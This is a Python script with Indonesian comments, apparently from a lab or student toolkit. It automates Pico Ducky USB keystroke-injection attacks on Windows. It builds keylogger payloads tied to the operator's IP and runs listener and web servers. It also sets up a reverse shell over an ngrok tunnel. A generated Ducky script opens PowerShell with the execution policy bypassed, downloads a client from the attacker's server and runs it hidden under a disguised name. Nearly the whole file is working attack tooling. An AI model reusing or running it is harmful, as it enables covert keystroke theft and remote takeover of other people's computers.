import os
import subprocess
import time
import requests
import json
import socket

# --- KONFIGURASI PATH ---
# Menentukan path secara dinamis berdasarkan lokasi skrip ini
try:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
except NameError:
    BASE_DIR = os.getcwd() # Fallback jika dijalankan secara interaktif

KEYLOGGER_DIR = "/home/pblrks611/PROTO/picoducky"
REVSHELL_DIR = "/home/pblrks611/PROTO/reverse_shell"

# ==============================================================================
# FUNGSI UTILITAS UMUM
# ==============================================================================

def find_pico_mount_point():
    """Mencari mount point Pico 'CIRCUITPY'."""
    print("\n[*] Mencari mount point Pico Ducky...")
    try:
        # Menggunakan lsblk untuk cara yang lebih andal
        output = subprocess.check_output(['lsblk', '-o', 'MOUNTPOINT', '-J'], stderr=subprocess.DEVNULL).decode('utf-8')
        data = json.loads(output)
        for device in data['blockdevices']:
            if 'children' in device:
                for child in device['children']:
                    mountpoint = child.get('mountpoint')
                    if mountpoint and 'CIRCUITPY' in os.path.basename(mountpoint):
                        print(f"[+] Pico ditemukan di: {mountpoint}")
                        return mountpoint
    except (FileNotFoundError, KeyError, json.JSONDecodeError):
        print("[!] lsblk tidak ditemukan atau gagal. Mencoba path manual...")

    # Fallback ke path hardcoded jika lsblk gagal
    try:
        user = os.getlogin()
        possible_paths = [f"/media/{user}/CIRCUITPY", "/mnt/CIRCUITPY"]
        for path in possible_paths:
            if os.path.isdir(path):
                print(f"[+] Pico ditemukan di: {path}")
                return path
    except Exception:
        pass

    print("[!] Gagal menemukan Pico secara otomatis.")
    return input("Masukkan path manual ke drive CIRCUITPY: ")

def get_local_ip():
    """Mendapatkan alamat IP lokal dari mesin."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        print("[!] Gagal mendapatkan IP lokal, menggunakan '127.0.0.1'. Pastikan terhubung ke jaringan.")
        return "127.0.0.1"

def copy_payload_to_pico(work_dir, payload_filename):
    """Fungsi generik untuk menyalin payload spesifik ke Pico."""
    input("\nSilakan hubungkan Pico Ducky ke port USB. Tekan Enter jika sudah terhubung...")
    pico_path = find_pico_mount_point()
    if not pico_path or not os.path.isdir(pico_path):
        print("\n[!] Error: Path Pico tidak valid. Setup dibatalkan.")
        return False

    source_payload_path = os.path.join(work_dir, payload_filename)
    if not os.path.isfile(source_payload_path):
        print(f"[!] Error: File payload sumber '{source_payload_path}' tidak ditemukan.")
        return False

    destination_path = os.path.join(pico_path, "payload.dd") # Nama file di Pico selalu payload.dd
    print(f"[*] Menyalin '{source_payload_path}' ke '{destination_path}'...")
    try:
        subprocess.run(['cp', source_payload_path, destination_path], check=True, stderr=subprocess.PIPE)
        print("[+] Payload berhasil disalin ke Pico.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Error saat menyalin payload: {e.stderr.decode()}")
        return False

# ==============================================================================
# FUNGSI KHUSUS KEYLOGGER (DENGAN OTOMATISASI IP)
# ==============================================================================

def menu_keylogger():
    """Sub-menu untuk serangan Keylogger."""
    while True:
        print(f"\n--- Opsi Payload Keylogger (Direktori: {KEYLOGGER_DIR}) ---")
        print("1. Buat & Setup Payload ke Pico (IP Dinamis)")
        print("2. Jalankan Listener & Server Web")
        print("9. Kembali ke Menu Utama")
        choice = input("Pilih aksi: ")

        if choice == '1':
            prepare_keylogger_payloads()
        elif choice == '2':
            run_keylogger_servers()
        elif choice == '9':
            break
        else:
            print("[!] Pilihan tidak valid.")

def prepare_keylogger_payloads():
    """Membuat file klien & payload keylogger dinamis, lalu menyalin ke Pico."""
    print("\n[*] Mempersiapkan payload keylogger dinamis...")
    TEMPLATE_CLIENT = "klogclient_template.py"
    FINAL_CLIENT = "klogclient.py" # Nama final yang akan diunduh
    TEMPLATE_PAYLOAD = "payload_keylogger_template.dd"
    FINAL_PAYLOAD = "payload.dd" # Nama file yang akan disalin ke Pico

    # Path absolut untuk file
    template_client_path = os.path.join(KEYLOGGER_DIR, TEMPLATE_CLIENT)
    final_client_path = os.path.join(KEYLOGGER_DIR, FINAL_CLIENT)
    template_payload_path = os.path.join(KEYLOGGER_DIR, TEMPLATE_PAYLOAD)
    final_payload_path = os.path.join(KEYLOGGER_DIR, FINAL_PAYLOAD)

    try:
        local_ip = get_local_ip()
        print(f"[*] IP lokal terdeteksi: {local_ip}")

        # Buat file klien final dari template
        with open(template_client_path, 'r') as f_in, open(final_client_path, 'w') as f_out:
            content = f_in.read().replace("YOUR_RASPI_IP_HERE", local_ip)
            f_out.write(content)
        print(f"[+] File klien '{FINAL_CLIENT}' berhasil dibuat.")

        # Buat file Ducky Script final dari template
        with open(template_payload_path, 'r') as f_in, open(final_payload_path, 'w') as f_out:
            content = f_in.read().replace("YOUR_RASPI_IP_HERE", local_ip)
            f_out.write(content)
        print(f"[+] File payload Ducky '{FINAL_PAYLOAD}' berhasil dibuat.")

        # Salin ke Pico
        copy_payload_to_pico(KEYLOGGER_DIR, FINAL_PAYLOAD)
        input("\nTekan Enter untuk kembali ke menu...")

    except FileNotFoundError:
        print(f"\n[!] Error: File template tidak ditemukan. Pastikan file berikut ada di {KEYLOGGER_DIR}:")
        print(f"    - {TEMPLATE_CLIENT}")
        print(f"    - {TEMPLATE_PAYLOAD}")
    except Exception as e:
        print(f"\n[!] Terjadi error: {e}")

def run_keylogger_servers():
    """Menjalankan listener keylogger dan server HTTP tanpa mengubah direktori."""
    LISTENER_FILE = "keyloglistener.py"
    listener_path = os.path.join(KEYLOGGER_DIR, LISTENER_FILE)
    procs = []
    try:
        print(f"\n--- Menjalankan Server untuk Keylogger ---")
        print(f"[*] Menjalankan listener dari: {listener_path}")
        # cwd=work_dir memastikan log disimpan di direktori yang benar
        listener_proc = subprocess.Popen(['python3', listener_path], cwd=KEYLOGGER_DIR)
        procs.append(listener_proc)

        print(f"[*] Menjalankan server web untuk direktori: {KEYLOGGER_DIR}")
        # Menambahkan argumen '--directory' untuk menunjuk ke path yang benar
        http_proc = subprocess.Popen(['python3', '-m', 'http.server', '8000', '--directory', KEYLOGGER_DIR],
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
        procs.append(http_proc)

        print("\n✅ Server berjalan. Monitor output keylogger di terminal ini.")
        print("Pastikan Anda sudah men-setup Pico dengan IP yang benar.")
        input("Tekan Enter untuk menghentikan semua server...")
    finally:
        print("\n[*] Menghentikan server...")
        for p in procs:
            try:
                p.kill()
            except ProcessLookupError:
                pass

# ==============================================================================
# FUNGSI KHUSUS REVERSE SHELL
# ==============================================================================

def menu_reverse_shell():
    """Sub-menu untuk serangan Reverse Shell."""
    print("\n--- Skenario Otomatis Reverse Shell ---")
    if input("Lanjutkan? (y/n): ").lower() != 'y':
        return

    procs, payload_file = prepare_and_run_revshell_servers()
    if not procs:
        print("[!] Persiapan server gagal.")
        return

    copy_payload_to_pico(REVSHELL_DIR, payload_file)

    input("\n✅ Pico siap digunakan. Tekan Enter jika ingin menghentikan server secara manual nanti (Ctrl+C)...")
    print("[*] Server masih berjalan. Tekan Ctrl+C untuk menghentikan.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Menghentikan semua server Reverse Shell...")
        for p in procs:
            try:
                p.kill()
            except ProcessLookupError:
                pass


# Ganti seluruh fungsi ini di dalam file pico_ducky_handler.py

def prepare_and_run_revshell_servers():
    """Mempersiapkan semua kebutuhan untuk serangan Reverse Shell tanpa mengubah direktori."""
    procs = []
    PAYLOAD_FILE = "payload_revshell.dd"
    try:
        print("\n[*] Memulai layanan Reverse Shell...")
        # Menjalankan semua proses dengan path absolut
        server_proc = subprocess.Popen(['python3', os.path.join(REVSHELL_DIR, "server_improved.py")])
        procs.append(server_proc)
        web_proc = subprocess.Popen(['python3', '-m', 'http.server', '8000', '--directory', REVSHELL_DIR], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.append(web_proc)
        ngrok_proc = subprocess.Popen(['ngrok', 'tcp', '4465'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.append(ngrok_proc)

        print("[+] Semua server dimulai. Menunggu ngrok (5 detik)...")
        time.sleep(5)

        response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
        response.raise_for_status()
        public_url = response.json()['tunnels'][0]['public_url']
        hostname = public_url.split('//')[1].split(':')[0]
        port = public_url.split(':')[-1]
        print(f"[+] Ngrok aktif: {hostname}:{port}")

        # Operasi file menggunakan path absolut
        TARGET_FINAL = "rs_client.py"
        template_path = os.path.join(REVSHELL_DIR, "target_template.py")
        final_path = os.path.join(REVSHELL_DIR, TARGET_FINAL)
        payload_path = os.path.join(REVSHELL_DIR, PAYLOAD_FILE)

        with open(template_path, 'r') as f_in, open(final_path, 'w') as f_out:
            content = f_in.read().replace("YOUR_IP_HERE", hostname).replace("12345", port)
            f_out.write(content)
        print(f"[+] File klien '{TARGET_FINAL}' berhasil dibuat.")

        local_ip = get_local_ip()
        # PEMBARUAN DUCKY SCRIPT DI SINI
        ducky_payload = f"""REM Auto-generated Reverse Shell Payload - Bypass Method
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -NonI -ExecutionPolicy Bypass
ENTER
DELAY 1500
STRING iwr http://{local_ip}:8000/{TARGET_FINAL} -O $env:TEMP\\wservice.py; Start-Process pythonw -ArgumentList "$env:TEMP\\wservice.py" -WindowStyle Hidden
ENTER
DELAY 500
STRING exit
ENTER"""
        
        with open(payload_path, 'w') as f:
            f.write(ducky_payload)
        print(f"[+] Payload Ducky '{PAYLOAD_FILE}' berhasil dibuat.")
        
        return procs, PAYLOAD_FILE

    except Exception as e:
        print(f"\n[!] Gagal saat persiapan: {e}")
        for p in procs:
            try:
                p.kill()
            except ProcessLookupError:
                pass
        return None, None

# ==============================================================================
# FUNGSI UTAMA YANG DIPANGGIL OLEH PBLRKS611.py
# ==============================================================================

def run_pico_ducky_attack():
    """Menu utama untuk memilih jenis serangan Pico Ducky."""
    while True:
        print("\n\n===== Opsi Pico Ducky Attack =====")
        print("1. Keylogger Windows (IP Dinamis)")
        print("2. Reverse Shell Windows (Metode Ngrok Tunnel)")
        print("9. Kembali ke Menu Utama")
        choice = input("Masukkan pilihan: ")

        if choice == '1':
            menu_keylogger()
        elif choice == '2':
            menu_reverse_shell()
        elif choice == '9':
            break
        else:
            print("[!] Pilihan tidak valid.")
